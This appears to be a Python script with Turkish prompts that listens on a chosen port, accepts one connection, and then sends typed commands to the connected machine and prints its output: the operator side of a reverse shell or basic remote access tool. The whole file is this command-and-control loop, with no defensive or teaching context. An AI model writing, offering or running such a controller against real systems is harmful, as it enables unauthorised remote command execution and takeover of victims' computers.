import socket
import os
import time

PORT = int(input("Port gir: "))
s = socket.socket()
try:
    s.bind(("0.0.0.0", PORT))
    s.listen(1)
    print(f"[✓] Dinleniyor: 0.0.0.0:{PORT}")
except Exception as e:
    print(f"[!] Port hatasi: {e}")
    exit()

try:
    conn, addr = s.accept()
    print(f"[✓] Baglandi: {addr}")
    print(conn.recv(1024).decode())
except Exception as e:
    print(f"[!] Baglanti hatasi: {e}")
    exit()

while True:
    try:
        komut = input("Komut > ")
        conn.send(komut.encode())
        if komut == "exit":
            break
        cevap = conn.recv(4096).decode()
        print(cevap)
    except Exception as e:
        print(f"[!] Baglanti koptu: {e}")
        break
